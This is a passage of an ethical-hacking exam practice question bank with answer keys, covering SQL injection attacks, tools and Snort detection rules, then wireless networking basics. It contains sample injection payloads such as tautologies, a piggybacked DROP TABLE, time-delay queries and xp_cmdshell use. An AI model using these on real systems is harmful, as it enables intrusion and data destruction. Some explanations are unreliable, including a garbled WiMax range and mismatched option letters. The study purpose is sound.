+ [ ] Blind SQL injection
> **Explanation:**
> + Blind/inferential SQL Injection: In a blind/inferential injection, the attacker has no error messages from the system with which to work. Instead, the attacker simply sends a malicious SQL query to the database.
> + Out-of-band SQL injection: Attackers use different communication channels (such as database e-mail functionality, or file writing and loading functions) to perform the attack and obtain the results.
> + In-band SQL injection: An attacker uses the same communication channel to perform the attack and retrieve the results.

539. In which of the following attacks does an attacker use a conditional OR clause in such a way that the condition of the WHERE clause will always be true?
+ [x] Tautology
+ [ ] UNION SQL injection
+ [ ] Illegal/logically incorrect query
+ [ ] End-of-line comment
> **Explanation:**
> In a UNION SQL injection, an attacker uses a UNION clause to append a malicious query to the requested query.  
An attacker may gain knowledge by injecting illegal/logically incorrect requests such as injectable parameters, data types, names of tables, and so on.  
In a tautology-based SQL injection attack, an attacker uses a conditional OR clause in such a way that the condition of the WHERE clause will always be true.  
In end-of-line SQL injection, an attacker uses Line comments in specific SQL injection inputs.

540. An attacker uses the following SQL query to perform an SQL injection attack SELECT * FROM users WHERE name = ‘’ OR ‘1’=‘1'; Identify the type of SQL injection attack performed.
+ [ ] End-of-Line Comment
+ [x] Tautology
+ [ ] UNION SQL Injection
+ [ ] Illegal/Logically Incorrect Query
> **Explanation:**
> In a tautology-based SQL injection attack, an attacker uses a conditional OR clause in such a way that the condition of the WHERE clause will always be true.
> 
> In SELECT * FROM users WHERE name = ‘’ OR ‘1’=‘1'; you can observe OR and WHERE present in the code. The OR clause is in such a way that the condition of the WHERE clause is true. So, This is a form of tautology-based SQL injection attack.
> 
> An attacker may gain knowledge by injecting illegal/logically incorrect requests such as injectable parameters, data types, names of tables, and so on.
> 
> In a UNION SQL injection, an attacker uses a UNION clause to append a malicious query to the requested query.
> 
> In End-of-Line SQL injection, an attacker uses Line comments in specific SQL injection inputs.

541. In which of the following attacks, does an attacker inject an additional malicious query to the original query?
+ [ ] UNION SQL Injection
+ [ ] Tautology
+ [ ] In-line Comments
+ [x] Piggybacked Query
> **Explanation:**
> Attackers simplify an SQL injection attack by integrating multiple vulnerable inputs into a single query using in-line comments.
> 
> In a Piggybacked SQL injection attack, an attacker injects an additional malicious query to the original query. The original query remains unmodified, and the attacker’s query is piggybacked on the original query.
> 
> For example, the original SQL query is as given below.
> `SELECT * FROM EMP WHERE EMP.EID = 1001 AND EMP.ENAME = ’Bob’`
> 
> Now, the attacker concatenates the delimiter (;) and malicious query to the original query as given below.
> `SELECT * FROM EMP WHERE EMP.EID = 1001 AND EMP.ENAME = ’Bob’;`
> `DROP TABLE DEPT;`
> 
> After executing the first query and returning the resultant database rows, the DBMS recognizes the delimiter and executes the injected malicious query. Consequently, the DBMS drops the table DEPT from the database.
> 
> In a tautology-based SQL injection attack, an attacker uses a conditional OR clause in such a way that the condition of the WHERE clause will always be true.
> 
> In a UNION SQL injection, an attacker uses a UNION clause to append a malicious query to the requested query.

542. In which of the following attacks does an attacker use an ORDER BY clause to find the right number of columns in a database table?
+ [x] UNION SQL injection
+ [ ] In-line comments
+ [ ] Piggybacked query
+ [ ] Tautology
> **Explanation:**
> In a UNION SQL injection, to find the right numbers of columns, the attacker first launches a query by using an ORDER BY clause, followed by a number to indicate the number of database columns selected:
> `ORDER BY 10--`

543. Which of the following attacks is time-intensive because the database should generate a new statement for each newly recovered bit?
+ [x] Blind SQL Injection
+ [ ] In-band SQL Injection
+ [ ] UNION SQL Injection
+ [ ] Error Based SQL Injection
> **Explanation:**
> A Blind/Inferential SQL Injection attack can become time-intensive because the database should generate a new statement for each newly recovered bit.Blind SQL Injection is used when a web application is vulnerable to an SQL injection but the results of the injection are not visible to the attacker. Blind SQL injection is identical to a normal SQL Injection except that when an attacker attempts to exploit an application rather than seeing a useful error message, a generic custom page is displayed. In blind SQL injection, an attacker poses a true or false question to the database to see if the application is vulnerable to SQL injection.

544. Which of the following commands is used to make the CPU wait for a specified amount of time before executing an SQL query?
+ [ ] GET_HOST_NAME()
+ [ ] UNION SELECT 1,null,null—
+ [ ] ORDER BY 10--
+ [x] WAITFOR DELAY '0:0:10'--
> **Explanation:**
> Time Delay SQL injection (sometimes called Time-based SQL injection) evaluates the time delay that occurs in response to true or false queries sent to the database. A waitfor statement stops SQL Server for a specific amount of time. Based on the response, an attacker will extract information such as connection time to the database made as the system administrator or as other users and launch further attacks.
> `WAIT FOR DELAY 'time' (Seconds)`
> 
> This is just like sleep; wait for a specified time. The CPU is a safe way to make a database wait.
> `WAITFOR DELAY '0:0:10'-`

545. Which of the following SQL queries is an example of a heavy query used in SQL injection?
+ [ ] SELECT Name, Price, Description FROM ITEM_DATA WHERE ITEM_ID = 67 AND 1 = 1
+ [x] SELECT * FROM products WHERE id=1 AND 1 < SELECT count(*) FROM all_users A, all_users B, all_users C
+ [ ] SELECT Name, Phone, Address FROM Users WHERE Id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable
+ [ ] SELECT * FROM products WHERE id_product=$id_product
> **Explanation:**
> For example, the following is a query in Oracle that takes a huge amount of time to execute:
> `SELECT count(*) FROM all_users A, all_users B, all_users C`
> 
> If an attacker injects a malicious parameter to the above query to perform a time-based SQL injection without using functions, then it takes the following form:
> `1 AND 1 < SELECT count(*) FROM all_users A, all_users B, all_users C`
> 
> The final resultant query takes the form:
> `SELECT * FROM products WHERE id=1 AND 1 < SELECT count(*) FROM all_users A, all_users B, all_users C`


## SQL Injection Methodology
546. A tester has been hired to do a web application security test. The tester notices that the site is dynamic and must make use of a back-end database. In order for the tester to see if an SQL injection is possible, what is the first character that the tester should use to attempt breaking a valid SQL request?
+ [x] Single quote
+ [ ] Exclamation mark
+ [ ] Double quote
+ [ ] Semicolon
> **Explanation:**
> A tester may try out with any character as per his interest. However, the first attempt any tester generally makes is using single quote. A semicolon is used to terminate SQL statements. A single quote is used to test whether the strings are properly filtered in the targeted application or not. An exclamation mark refers to NOT in SQL. According to https://docs.microsoft.com, “All strings delimited by double quotation marks are interpreted as object identifiers.”

547. During a penetration test, a tester finds a target that is running MS SQL 2000 with default credentials. The tester assumes that the service is running with a local system account. How can this weakness be exploited to access the system?
+ [ ] Using the Metasploit psexec module setting the SA/admin credential
+ [ ] Invoking the stored procedure cmd_shell to spawn a Windows command shell
+ [x] Invoking the stored procedure xp_cmdshell to spawn a Windows command shell
+ [ ] Invoking the stored procedure xp_shell to spawn a Windows command shell
> **Explanation:**
> Microsoft SQL server has a built-in extended stored procedure to execute commands and return their standard output on the underlying operating system: xp_cmdshell(). This stored procedure is enabled by default on Microsoft SQL Server 2000. On Microsoft SQL Server 2000, the sp_addextendedproc stored procedure can be used. The attacker can create a new procedure from scratch using a shell object if the session user has the required privileges. This technique has been illustrated numerous times and can still be used if the session user is highly privileged. On all Microsoft SQL server versions, this procedure can be executed only by users with the sysadmin server role on.

548. Which tool is used to automate SQL injections and exploit a database by forcing a given web application to connect to another database controlled by a hacker?
+ [ ] Cain and Abel
+ [ ] NetCat
+ [x] DataThief
+ [ ] Nmap
> **Explanation:**
> + **DataThief:** DataThief is a tool used to demonstrate to web administrators and developers how to steal data from a web application that is vulnerable to SQL Injection. Data Thief is designed to retrieve the data from a Microsoft SQL Server back-end behind a web application with a SQL Injection vulnerability.
> + **NetCat:** Netcat is a networking utility that reads and writes data across network connections, using the TCP/IP protocol. It is a reliable ""back-end"" tool used directly or driven by other programs and scripts. It is also a network debugging and exploration tool.
> + **Cain and Abel:** Cain & Abel is a password recovery tool that runs on the Microsoft operating system. It allows you to recover various kinds of passwords by sniffing the network, cracking encrypted passwords using a dictionary, brute-force and cryptanalysis attacks, recording VoIP conversations, decoding scrambled passwords, recovering wireless network keys, revealing password boxes, uncovering cached passwords, and analyzing routing protocols. The Cain & Abel tool recovers passwords and credentials from various sources easily.
> + **Nmap:** Nmap is a security scanner for network exploration and hacking. It allows you to discover hosts and services on a computer network, thus creating a "map" of the network. It sends specially crafted packets to the target host and then analyzes the responses to accomplish its goal.

549. Fill in the blank:  
______ function is an IDS evasion technique that can be used to inject SQL statements into MySQL database without using double quotes.
+ [ ] CONV()
+ [ ] CHR()
+ [ ] ASCIISTR()
+ [x] CHAR()
> **Explanation:**
> With the char() function, an attacker can encode a common injection variable present in the input string in an attempt to avoid detection in the signatures of network security measures. This char() function converts hexadecimal and decimal values into characters that can easily pass through SQL engine parsing.
> 
> Wrong answers:  
> b. Matlab function that returns the convolution of vectors  
> c. The Oracle ASCIISTR function takes a string (or an expression that resolves to a string), and returns an ASCII version of the string in the cur  
> d. The Oracle CHR() function returns the ASCII character that corresponds to the value passed to it.

550. William has been hired by the ITSec, Inc. to perform web application security testing. He was asked to perform black box penetration testing to test the security of the company’s web applications. No information is provided to William about the company’s network and infrastructure. William notices that the company website is dynamic and must make use of a backend database. He wants to see if an SQL injection would be possible. As part of the testing, he tries to catch instances where the user input is used as part of an SQL identifier without any input sanitization. Which of the following characters should William use as the input data to catch the above instances?
+ [ ] Right square bracket
+ [ ] Semicolon
+ [x] Double quote
+ [x] Single quote
> **Explanation:**
> **Single and double quotes:** In black box penetration testing, single and double quotes are used as the input data to catch instances where the user input is not sanitized.
> 
> **Semicolon:** In black box penetration testing, a semicolon is used to group two or more SQL statements in the same line.

551. A tester has been hired to perform source code review of a web application to detect SQL injection vulnerabilities. As part of the testing process, he needs to get all the information about the project from the development team. During the discussion with the development team, he comes to know that the project is in the initial stage of the development cycle. As per the above scenario, which of the following processes does the tester need to follow in order to save the company’s time and money?
+ [ ] The tester needs to perform dynamic code analysis as it uncovers bugs in the software system
+ [ ] The tester needs to perform dynamic code analysis as it finds and fixes the defects
+ [ ] The tester needs to perform static code analysis as it covers the executable file of the code
+ [x] The tester needs to perform static code analysis as it covers the structural and statement coverage testing
> **Explanation:**
> Option A: The main objective of static code analysis is to improve the quality of software products by finding errors in the early stages of the development cycle. In static testing, code is not executed. It involves manual or automated reviews of the documents. This review is done during the initial phase of the testing to catch defects early in SDLC. It assesses the code and documentation and covers the structural and statement coverage testing.
> 
> Option B: Static code analysis is performed in early stages of the development cycle. In static testing, code is not executed, so it does not cover the testing of an executable file of the code.
> 
> Option C: Dynamic code analysis checks for functional behavior of the software system, memory/CPU usage, and overall performance of the system. In dynamic testing, code is executed to uncover bugs in the software system. This testing is not performed in the early stages of the development cycle.
> 
> Option D: Dynamic code analysis finds and fixes the defects, but the cost of finding and fixing defects is high.

552. Robert, a penetration tester is trying to perform SQL penetration testing on the SQL database of the company to discover coding errors and security loopholes. Robert sends massive amounts of random data to the SQL database through the web application in order to crash the web application of the company. After observing the changes in the output, he comes to know that web application is vulnerable to SQL injection attacks. Which of the following testing techniques is Robert using to find out the loopholes?
+ [ ] Stored Procedure Injection
+ [ ] Alternate Encodings
+ [ ] Out of Band Exploitation
+ [x] Fuzzing Testing
> **Explanation:**
> Stored Procedure Injection: Stored procedures are used at the back end of the web application to support its functionalities. In the stored procedure injection techniques, malicious SQL queries are executed within the stored procedure.
> 
> Out of Band Exploitation: In the Out of Band exploitation technique, the tester creates an alternate channel to retrieve data from the server.
> 
> Alternate Encodings: In the alternate encodings technique, the tester modifies the SQL injection query by using alternate encoding, such as hexadecimal, ASCII, and Unicode.
> 
> Fuzzing Testing: Fuzz testing (fuzzing) is a black box testing method. It is a quality checking and assurance technique used to identify coding errors and security loopholes in web applications.Huge amounts of random data called ‘Fuzz’ will be generated by the fuzz testing tools (Fuzzers) and used against the target web application to discover vulnerabilities that can be exploited by various attacks.

553. David, a penetration tester, was asked to check the MySQL database of the company for SQL injection attacks. He decided to check the back end database for a double blind SQL injection attack. He knows that double blind SQL injection exploitation is performed based on an analysis of time delays and he needs to use some functions to process the time delays. David wanted to use a function which does not use the processor resources of the server. Which of the following function David need to use?
+ [x] sleep()
+ [ ] mysql_query()
+ [ ] addcslashes()
+ [ ] benchmark()
> **Explanation:**
> sleep(): This function does not use processor resources of the server. Function sleep() represents an analogue of function benchmark(). Function sleep() is more secure in the given context, because it does not use server resources.
> 
> benchmark(): This function uses the processor resources of the server.
> 
> mysql_query(): This function does not permit query stacking or executing multiple queries in a single function call.
> 
> addcslashes(): This function allows the tester to specify a character range to escape.

554. Michel, a professional hacker, is trying to perform time-based blind SQL injection attacks on the MySQL backend database of RadioTV Inc. He decided to use an SQL injection tool to perform this attack. Michel surfed the Internet and finally found a tool which has the following features:
	+ Sends heavy queries to the target database to perform a Time-Based Blind SQL Injection attack.
	+ Database Schema extraction from SQL Server, Oracle and MySQL.
	+ Data extraction from Microsoft Access 97/2000/2003/2007 databases.
	+ Parameter Injection using HTTP GET or POST.
Which of the following tools does Michael use to perform time-based blind SQL injection attacks on the MySQL backend database?
+ [x] Marathon Tool
+ [ ] WebCruiser
+ [ ] SQLDict
+ [ ] SQLiX
> **Explanation:**
> + **Marathon Tool:** Marathon Tool is a POC for using heavy queries to perform a Time-Based Blind SQL Injection attack. This tool is still a work in progress, but is right now in a very good alpha version. It can be used to extract information from web applications using Microsoft SQL Server, Microsoft Access, MySQL or Oracle Databases. (Source: https://marathontool.codeplex.com/)
> + **SQLiX:** SQLiX is an SQL Injection scanner coded in Perl. It is able to crawl, detect SQL injection vectors, identify the back-end database, and grab function call/UDF results (even execute system commands for MS-SQL). (Source: https://www.owasp.org/index.php/Category:OASP_SQLiX_Project)
> + **SQLDict:** SQLDict is a basic single-IP brute-force S SQL Server password utility that can carry out a dictionary attack against a named SQL account. Specify the IP address to attack, and the user account, and then load an appropriate word list to try. (Source: http://ntsecurity.nu)
> + **WebCruiser:** WebCruiser is a Web Vulnerability and web pen testing tool used for auditing website security. It supports scanning a website as well as POC (Proof of concept) for web vulnerabilities like SQL Injection, Cross Site Scripting, XPath Injection, etc. (Source: http://sec4app.com)

555. Shea is a licensed penetration tester. She is working with a client to test their new e-commerce website for SQL injection. After signing the NDA and agreeing on the rules of engagement (RoE), she starts by examining and listing all the input fields on the website. She tries to insert a string value in the CVV2 textbox, where a three-digit number is expected, and she ends up with the below error message.

![](./Images/0555.png)

Identify in which stage of the SQL injection methodology is Shea right now.
+ [ ] Exploit second-order SQL injection
+ [ ] Launch SQL injection attacks
+ [x] Information gathering and SQL injection vulnerability detection
+ [ ] Perform blind SQL injection
> **Explanation:**
> The SQL injection methodology consists of three stages:  
> 	1. Information gathering and SQL injection vulnerability detection,  
> 	2. launch SQL injection attacks, and  
> 	3. advanced SQL injection.  
> 
> In the information gathering stage, attackers try to gather information about the target database such as database name, version, users, output mechanism, DB type, user privilege level, and OS interaction level. Once the information is gathered, the attacker then tries to look for SQL vulnerabilities in the target web application. For that, the attacker lists all input fields and hidden fields, and posts requests on the website and then tries to inject code into the input fields to generate an error. The attacker then tries to carry out different types of SQL injection attacks such as error-based SQL injection, union-based SQL injection, blind SQL injection, and so on.
> 
> Shea is currently at the information gathering and SQL injection vulnerability detection stage.  
> 
> ( c ) and ( d ) are wrong because the question is about SQL injection methodology stages and not about specific stage steps.

556. Talisa is inspecting the website Movie Scope for SQL injection attacks. She is using an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and the taking over of database servers. The tool is called sqlmap. Talisa was able to find and exploit an SQL injection vulnerability in the user ID parameter on the website. Now she has full control over the DBMS. However, she had to prove to the website owner that she was able to execute SQL commands on the DB server and successfully retrieve answers from the DB prior to getting paid. From the screenshot below, identify the SQL command that Talisa used in order to retrieve the DBMS version.

![](./Images/0556.png)

+ [ ] GET @@VERSION
+ [ ] SELECT * FROM VERSION
+ [ ] SELECT @VERSION
+ [x] SELECT @@VERSION
> **Explanation:**
> The string “SELECT” can be represented by the hexadecimal number 0x73656c656374, which most likely will not be detected by a signature protection mechanism.
> 
> The DBMS is Microsoft SQL Server and the correct SQL statement to retrieve the SQL server database version is SELECT @@VERSION


## SQL injection Countermeasures
557. Select all correct answers. To defend against SQL injection, a developer needs to take proper actions in configuring and developing an application. Select all correct statements that help in defending against SQL injection attacks.
+ [ ] Apply input validation only on the client-side
+ [x] Avoid constructing dynamic SQL with concatenated Input values
+ [x] Keep untrusted data separate from commands and queries
+ [x] Ensure that the Web configuration files for each application do not contain sensitive information
> **Explanation:**
> Some of the countermeasures listed below are used to defend against SQL injection attacks:
> + Avoid constructing dynamic SQL with concatenated input values.
> + Ensure that the Web configuration files for each application do not contain sensitive information.
> + Use the most restrictive SQL account types for applications.
> + Use Network, host, and application intrusion detection systems to monitor injection attacks.
> + Perform automated black box injection testing, static source code analysis, and manual penetration testing to probe for vulnerabilities.
> 
> Keep untrusted data separate from commands and queries.

558. Snort is an open-source, free and lightweight network intrusion detection system (NIDS) software for Linux and Windows to detect emerging threats. Snort can be used to detect SQL injection attacks. Identify the correct Snort rule to detect SQL injection attacks.
+ [x] `alert tcp $EXTERNAL_NET any -> 172.16.66.23 443 (msg:""SQL Injection attempt on Finance Dept. webserver""; flow:to_server,estahlished; uricontent:"".pl"";pcre:""/(\%27)|(\')|(\-\-)|(%23)|(#)/i""; classtype:Web-application-attack; sid:9099; rev:5;) rule SQLiTester {`
+ [ ] `ule SQLiTester { meta: description = ""SQL Injection tester"" author = ""Ellaria Sand"" date = ""2016-04-26"" hash = ""dc098f88157b5cbf3ffc82e6966634bd280421eb"" strings: $s0 = "" SQL Injection tester"" ascii $s17 = ""/Blind SQL injection tool"" fullword ascii $s18 = ""WAITFOR DELAY '0:0:10' --"" fullword wide condition: uint32(0) == 0x5a4d and filesize < 1040KB and all of them }`
+ [ ] `meta: description = ""SQL Injection tester"" author = ""Ellaria Sand"" date = ""2016-04-26"" hash = ""dc098f88157b5cbf3ffc82e6966634bd280421eb"" strings: $s0 = "" SQL Injection tester"" ascii $s17 = ""/Blind SQL injection tool"" fullword ascii $s18 = ""SELECT UNICODE(SUBSTRING((system_user),{0},1))"" fullword wide condition: uint16(0) == 0x5a4d and filesize < 1040KB and all of them }`
+ [ ] `alert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:""SQL Injection attempt on Finance Dept. webserver""; flow:stateless; ack:0; flags:S; ttl:>220; reference:arachnids,439; classtype:attempted-recon; sid:613; rev:6;)"`
> **Explanation:**
> B and C are YARA rules and D is a Snort rule for SYN scanning. A is a snort rule for SQL Injection attempt on Finance Department webserver. So A is the correct answer.

559. Which of the following practices makes web applications vulnerable to SQL injection attacks?
+ [ ] Firewalling the SQL server
+ [x] Database server running OS commands
+ [ ] Minimizing privileges
+ [ ] Implementing consistent coding standards
> **Explanation:**
> Web applications are vulnerable to SQL injection attacks due to:
> + **The database server runs OS commands**
> + Using a privileged account to connect to the database
> + Error message revealing important information
> + No data validation at the server
> 
> Defensive measures against SQL injection attacks
> + Implementing consistent coding standards
> + Minimizing privileges
> + Firewalling the server

560. Which of the following tools is used for detecting SQL injection attacks?
+ [ ] NetScanTools Pro
+ [x] IBM Security AppScan
+ [ ] Nmap
+ [ ] Wireshark
> **Explanation:**
> IBM Security AppScan enhances web and mobile application security, improves application security, and strengthens regulatory compliance. By scanning web and mobile applications prior to deployment, AppScan identifies security vulnerabilities, generates reports, and makes recommendations to apply fixes.

561. Which of the following tools provides automated web application security testing with innovative technologies including DeepScan and AcuSensor technology?
+ [ ] IBM Security AppScan
+ [x] Acunetix web vulnerability scanner
+ [ ] SoftPerfect network scanner
+ [ ] Hping2 / Hping3
> **Explanation:**
> Acunetix Web Vulnerability Scanner provides automated web application security testing with innovative technologies including DeepScan and AcuSensor Technology. It rigorously tests for thousands of web application vulnerabilities including SQL injection and XSS.

562. Which of the following tools is used to build rules that aim to detect SQL injection attacks?
+ [x] Snort
+ [ ] Nmap
+ [ ] Masscan
+ [ ] SuperScan
> **Explanation:**
> Many of the common attacks use specific types of code sequences or commands that allow attackers to gain an unauthorized access to the target’s system and data. These commands and code sequences allow a user to write Snort rules that aim to detect SQL injection attacks

563. Which of the following countermeasures prevent buffer overruns?
+ [ ] Keep untrusted data separate from commands and queries
+ [ ] Use the most restrictive SQL account types for applications
+ [ ] Apply the least privilege rule to run the applications that access the DBMS
+ [x] Test the size and data type of the input and enforce appropriate limits
> **Explanation:**
> All the options are some of the countermeasures of SQL Injections. However, option C. i.e. Test the size and data type of the input and enforce appropriate limits is to prevent buffer overruns.

564. Robert is a user with a privileged account and he is capable of connecting to the database. Rock wants to exploit Robert’s privilege account. How can he do that?
+ [ ] Design the code in such a way it traps and handles exceptions appropriately
+ [ ] Reject entries that contain binary data, escape sequences, and comment characters
+ [x] Access the database and perform malicious activities at the OS level
+ [ ] Use the most restrictive SQL account types for applications
> **Explanation:**
> 

565. Which of the following commands has to be disabled to prevent exploitation at the OS level?
+ [x] xp_cmdshell
+ [ ] ping
+ [ ] execute
+ [ ] cat
> **Explanation:**
> The xp_cmdshell option is an SQL server configuration option that enables system administrators to control whether the xp_cmdshell extended stored procedure can be executed on a system. Disable commands such as xp_cmdshell, as they can affect the OS of the system.

566. Which of the following is a Snort rule that is used to detect and block SQL injection attack?
+ [x] `/(\%27)|(\')|(\-\-)|(\%23)|(#)/ix`
+ [ ] `' OR 5 BETWEEN 1 AND 7`
+ [ ] `SqlDataAdapter myCommand = new SqlDataAdapter("LoginStoredProcedure '" + Login.Text +"'", conn);`
+ [ ] `UNION Select Password`
> **Explanation:**
> Many of the common attacks use specific type of code sequences or commands that allow attackers to gain an unauthorized access to the target’s system and data. These commands and code sequences allow a user to write Snort rules that aim to detect SQL injection attacks.
> 
> Some of the expressions that can be blocked by the Snort are as follows:
> + `/(\%27)|(\')|(\-\-)|(\%23)|(#)/ix`
> + `/exec(\s|\+)+(s|x)p\w+/ix`
> + `/((\%27)|(\'))union/ix`
> + `/\w*((\%27)|(\'))((\%6F)|o|(\%4F))((\%72)|r|(\%52))/ix`
> + `alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (msg:"SQL Injection - Paranoid"; flow:to_server,established;uricontent:".pl";pcre:"/(\%27)|(\')|(\-\-)|(%23)|(#)/i"; classtype:Web-application-attack; sid:9099; rev:5`

# 16. Hacking Wireless Networks
## Wireless Concepts and Standards
567. Which type of antenna is used in wireless communication?
+ [x] Omnidirectional
+ [ ] Uni-directional
+ [ ] Parabolic
+ [ ] Bi-directional
> **Explanation:**
> Omnidirectional antennas radiate electromagnetic energy in all directions. They usually uniformly radiate strong waves in two dimensions, but not as strong in the third. A good example of an omnidirectional antenna is one used by radio stations. These antennas are effective for radio signal transmission because the receiver may not be stationary. Therefore, a radio can receive a signal regardless of where it is.

568. True or False.  
In LAN-to-LAN Wireless Network, the APs provide wireless connectivity to local computers, and computers on different networks that can be interconnected?  
+ [x] True
+ [ ] False
> **Explanation:**
> In LAN-to-LAN Wireless Network, APs provide wireless connectivity to local computers, and computers on different networks can also be interconnected. All hardware APs have the capability to interconnect with other hardware APs. However, interconnecting LANs over wireless connections is a complex task.

569. Which of the following describes the amount of information that may be broadcasted over a connection?
+ [x] Bandwidth
+ [ ] Hotspot
+ [ ] Association
+ [ ] BSSID
> **Explanation:**
> The bandwidth describes the amount of information that may be broadcasted over a connection. Usually, a bandwidth refers to the rate of data transfer. The unit of measuring the bandwidth is bits (amount of data) per second (bps).

570. Which of the following is used to connect wireless devices to a wireless/wired network?
+ [ ] Bandwidth
+ [ ] Association
+ [ ] Hotspot
+ [x] Access point (AP)
> **Explanation:**
> Answer is access point.
> + **Bandwidth:** It describes the amount of information that may be broadcasted over a connection. Usually, bandwidth refers to the data transfer rate. The unit of measuring the bandwidth is bits (amount of data) per second (bps)  
> + **Hotspot:** Places where wireless networks are available for public use. Hotspots refer to areas with Wi-Fi availability, where users can enable Wi-Fi on their devices and connect to the Internet through a hotspot.  
> + **Access point (AP):** Access point (AP) is used to connect wireless devices to a wireless/wired network. It allows wireless communication devices to connect to a wireless network through wireless standards such as Bluetooth and Wi-Fi. It serves as a switch or a hub between the wired LAN and wireless network.  
> + **Association:** The process of connecting a wireless device to an AP  

571. In which of the following processes do the station and access point use the same WEP key to provide authentication, which means that this key should be enabled and configured manually on both the access point and the client?
+ [ ] WEP encryption
+ [x] Shared key authentication process
+ [ ] WPA encryption
+ [ ] Open-system authentication process
> **Explanation:**
> In a shared key authentication process, each wireless station receives a shared secret key over a secure channel that is distinct from the 802.11 wireless network communication channels. The following steps illustrate the establishment of connection in the shared key authentication process:  
> + The station sends an authentication frame to the AP.  
> + The AP sends a challenge text to the station.  
> + The station encrypts the challenge text by making use of its configured 64- or 128-bit key, and it sends the encrypted text to the AP.  
> + The AP uses its configured WEP key to decrypt the encrypted text. The AP compares the decrypted text with the original challenge text. If the decrypted text matches the original challenge text, the AP authenticates the station.  
> + The station connects to the network.

572. Which of the following is considered as a token to identify a 802.11 (Wi-Fi) network (by default it is the part of the frame header sent over a wireless local area network (WLAN))?
+ [ ] Association
+ [x] SSID
+ [ ] Hotspot
+ [ ] Access Point
> **Explanation:**
> An SSID is a human-readable text string with a maximum length of 32 bytes. The SSID is a token to identify an 802.11 (Wi-Fi) network; by default, it is a part of the frame header sent over a wireless local area network (WLAN). It acts as a single shared identifier between the access points and clients. If the SSID of the network is changed, reconfiguration of the SSID on every host is required, as every user of the network configures the SSID into their system.

573. Which of the following networks is used for very long-distance communication?
+ [ ] Wi-Fi
+ [ ] ZigBee
+ [ ] Bluetooth
+ [x] WiMax
> **Explanation:**
> The IEEE 802.16 standard is a wireless communications standard designed to provide multiple physical layer (PHY) and media access control (MAC) options. It is also known as WiMax. This standard is a specification for fixed broadband wireless metropolitan access networks (MANs) that use a point-to-multipoint architecture. It has a range of 1609.34 – 9656.06 kilometers (1–6 miles).

574. Which of the following is considered as the method of transmitting radio signals by rapidly switching a carrier among many frequency channels?
+ [ ] Multiple input, multiple output orthogonal frequency-division multiplexing (MIMO-OFDM)
+ [x] Frequency-hopping Spread Spectrum (FHSS)
+ [ ] Orthogonal Frequency-division Multiplexing (OFDM)
+ [ ] Direct-sequence Spread Spectrum (DSSS)
> **Explanation:**
> Answer is Frequency-hopping Spread Spectrum (FHSS).
> + **Orthogonal Frequency-division Multiplexing (OFDM):** OFDM is a method of digital modulation of data in which a signal, at a chosen frequency, is split into multiple carrier frequencies that are orthogonal (occurring at right angles) to each other. OFDM maps information on the changes in the carrier phase, frequency, or amplitude, or a combination of these, and shares bandwidth with other independent channels. It produces a transmission scheme that supports higher bit rates than a parallel channel operation. It is also a method of encoding digital data on multiple carrier frequencies.
> + **Multiple input, multiple output-orthogonal frequency-division multiplexing (MIMO-OFDM):** MIMO-OFDM influences the spectral efficiency of 4G and 5G wireless communication services. Adopting the MIMO-OFDM technique reduces the interference and increases how robust the channel is.
> + **Direct-sequence Spread Spectrum (DSSS):** DSSS is a spread spectrum technique that multiplies the original data signal with a pseudo random noise spreading code. Also referred to as a data transmission scheme or modulation scheme, the technique protects signals against interference or jamming.
> + **Frequency-hopping Spread Spectrum (FHSS):** Frequency-hopping Spread Spectrum (FHSS) is the method of transmitting radio signals by rapidly switching a carrier among many frequency channels. Direct-sequence Spread Spectrum (DSSS) refers to the original data signal and is multiplied with a pseudo random noise spreading code. Multiple input, multiple output orthogonal frequency-division multiplexing (MIMO-OFDM) is an air interface for 4G and 5G broadband wireless communications and Orthogonal Frequency-division Multiplexing (OFDM) is the method of encoding digital data on multiple carrier frequencies.

575. In which of the following is the original data signal multiplied with a pseudo random noise spreading code?
+ [ ] Frequency-hopping Spread Spectrum (FHSS)
+ [ ] Orthogonal Frequency-division Multiplexing (OFDM)
+ [ ] Multiple input, multiple output orthogonal frequency-division multiplexing (MIMO-OFDM)
+ [x] Direct-sequence Spread Spectrum (DSSS)
> **Explanation:**
> + **Orthogonal Frequency-division Multiplexing (OFDM):** OFDM is a method of digital modulation of data in which a signal, at a chosen frequency, is split into multiple carrier frequencies that are orthogonal (occurring at right angles) to each other. OFDM maps information on the changes in the carrier phase, frequency, or amplitude, or a combination of these, and shares bandwidth with other independent channels.  
> + **Multiple input, multiple output-orthogonal frequency-division multiplexing (MIMO-OFDM):** MIMO-OFDM influences the spectral efficiency of 4G and 5G wireless communication services. Adopting the MIMO-OFDM technique reduces the interference and increases how robust the channel is.  
> + **Direct-sequence Spread Spectrum (DSSS):** DSSS is a spread spectrum technique that multiplies the original data signal with a pseudo random noise spreading code. Also referred to as a data transmission scheme or modulation scheme, the technique protects signals against interference or jamming.  
> + **Frequency-hopping Spread Spectrum (FHSS):** Frequency-hopping Spread Spectrum (FHSS) is the method of transmitting radio signals by rapidly switching a carrier among many frequency channels. Direct-sequence Spread Spectrum (DSSS) refers to the original data signal and is multiplied with a pseudo random noise spreading code. Multiple input, multiple output orthogonal frequency-division multiplexing (MIMO-OFDM) is an air interface for 4G and 5G broadband wireless communications and Orthogonal Frequency-division Multiplexing (OFDM) is the method of encoding digital data on multiple carrier frequencies.

576. Which of the following types of antennas is useful for transmitting weak radio signals over very long distances – on the order of 10 miles?
+ [ ] Bi-directional
+ [x] Parabolic grid
+ [ ] Omnidirectional
+ [ ] Uni-directional
> **Explanation:**
> A parabolic grid antenna uses the same principle as that of a satellite dish, but it does not have a solid backing. It consists of a semidish that is in the form of a grid made of aluminum wire. These parabolic grid antennas can achieve very long-distance Wi-Fi transmissions by using a highly focused radio beam. This type of antenna is useful for transmitting weak radio signals over very long distances – on the order of 10 miles. This enables attackers to get better signal quality, resulting in more data on which to eavesdrop, more bandwidth to abuse, and higher power output that is essential in layer 1 denial of service (DoS) and man-in-the-middle (MITM) attacks. The design of this antenna saves weight and space, and it can pick up Wi-Fi signals that are either horizontally or vertically polarized.


## Wireless Encryption Algorithms
577. WPA2 uses AES for wireless data encryption at which of the following encryption levels?
+ [x] 128 bit and CCMP
+ [ ] 64 bit and CCMP
+ [ ] 128 bit and TKIP
+ [ ] 128 bit and CRC
> **Explanation:**
> CRC 128 bit, TKIP 128 bit is used by WPA. CCMP 128 bit is used by WPA2 for wireless data encryption.
> 
